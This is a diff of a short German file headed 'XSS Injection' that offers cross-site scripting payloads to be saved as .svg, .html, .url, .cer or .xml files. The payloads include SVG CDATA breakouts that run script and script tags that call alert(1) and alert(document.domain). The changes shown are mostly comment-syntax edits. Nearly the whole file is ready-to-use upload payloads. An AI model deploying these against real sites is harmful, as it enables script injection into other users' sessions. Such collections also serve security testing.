@@ -1,7 +1,8 @@
-// XSS Injection Beispiele 
-// Text Datei erstellen, Beispiel aussuchen und als .svg, html, url, cer, xml speichern.
+<!-- XSS Injection -->
+<!-- Text Datei erstellen, Beispiel aussuchen und als .svg, .html, .url, .cer, .xml speichern -->
 
-//.svg
+
+<!-- SVG Datei -->
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
@@ -12,28 +13,28 @@
    </script>
 </svg>
 
-//.svg
+<!-- SVG Datei -->
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
 
-//.svg
+<!-- SVG Datei -->
 <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
 
-//.svg
+<!-- SVG Datei -->
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
 
 
-//.html
+<!-- HTML Datei -->
 <script>alert(1)</script>
 
-//.url
+<!-- URL Datei -->
 <html>
     <script>alert(document.domain)</script>
 </html>
 
-//.cer
+<!-- CER Datei -->
 <script>alert(1)</script>
 
-//.xml
+<!-- XML Datei -->
 <html>
 	<head></head>
 	<body>
@@ -53,4 +54,5 @@
 	</body>
 </html>
 
-// By DaUfooo 2025
+
+<!-- By DaUfooo 2025 -->
